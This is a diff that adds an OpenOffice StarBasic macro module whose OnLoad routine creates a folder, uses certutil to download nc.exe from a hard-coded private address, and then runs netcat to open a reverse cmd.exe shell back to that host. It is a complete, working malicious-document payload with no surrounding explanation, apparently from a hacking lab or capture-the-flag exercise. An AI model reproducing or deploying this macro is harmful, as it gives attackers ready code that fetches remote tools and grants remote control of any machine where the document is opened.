@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "- //OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">
+
+    Sub OnLoad
+     MkDir "C:\x3ph"
+     Shell("certutil.exe -urlcache -split -f 'http://10.10.15.42:8000/nc.exe' C:\x3ph\nc.exe")
+     Shell("C:\x3ph\nc.exe 10.10.15.42 32116 -e cmd.exe")
+    End Sub
+
+</script:module>
